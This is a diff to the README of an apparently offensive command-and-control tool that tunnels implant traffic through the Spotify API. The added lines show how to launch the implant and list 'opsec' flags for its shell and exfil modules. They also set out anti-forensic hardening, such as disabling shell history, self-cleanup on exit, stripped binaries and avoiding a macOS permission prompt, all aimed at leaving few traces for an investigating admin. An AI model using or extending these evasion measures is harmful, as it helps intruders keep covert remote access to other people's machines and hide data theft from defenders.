@@ -116,7 +116,15 @@ make lint         # go vet
 
 ```bash
 # Terminal 1: Start implant (auto-generates session key)
+# Token must be pre-staged: SPOTIFY_TOKEN_JSON, --token-file, or .cache file.
+# The implant NEVER runs interactive OAuth and NEVER writes a token cache.
 ./spotexfil-darwin-arm64 c2-implant --interval 30 --jitter 10
+
+# Opsec flags:
+#   --quiet / -q              suppress non-error output
+#   --modules shell,exfil     module allowlist (e.g. disable screenshot
+#                             to avoid the macOS Screen Recording prompt)
+#   --token-file tok.json     pre-staged token (or SPOTIFY_TOKEN_JSON env)
 
 # Output:
 # [*] Session key: bravo-kilo-seven-echo-tango-lima
@@ -273,6 +281,23 @@ Other:
 | Jittered polling | Configurable interval + random jitter |
 | Exponential backoff | Independent read/write backoff with auto-recovery |
 | Random OAuth state | No tool fingerprint in OAuth flow |
+
+### Implant hardening (host forensics)
+
+Measures to minimize artifacts left on the implant host if an admin investigates:
+
+| Measure | Detail |
+|---------|--------|
+| No interactive OAuth on target | Implant fails closed unless a token is pre-staged (`SPOTIFY_TOKEN_JSON`, `--token-file`, or `.cache`) — no browser, no local callback listener |
+| No token cache on target | Implant never writes `.cache-<username>` (in-memory token only) |
+| Self-cleanup on exit | SIGINT/SIGTERM → best-effort cleanup of its command queue + session key zeroing (Go/GC caveat: string keys can't be reliably wiped) |
+| Quiet mode | `--quiet` suppresses non-error stdout (scrollback/syslog crumbs) |
+| Module allowlist | `--modules shell,exfil,...` disables noisy modules — e.g. `screenshot` triggers a macOS Screen Recording (TCC) prompt |
+| Shell env hardening | Commands run with `HISTFILE=/dev/null HISTSIZE=0` |
+| Trimmed binaries | Built with `-trimpath -buildvcs=false -s -w` — no local build paths or VCS metadata embedded |
+| Auto-generated keys | Session key never appears in argv/ps |
+
+Note: this PoC hides traffic *content*, not *presence*. On a host where the user never runs Spotify, connections to `api.spotify.com` are themselves an anomaly.
 
 ### Resilience
 - **Operator restart**: implant heartbeats every 60s, new operator picks it up automatically
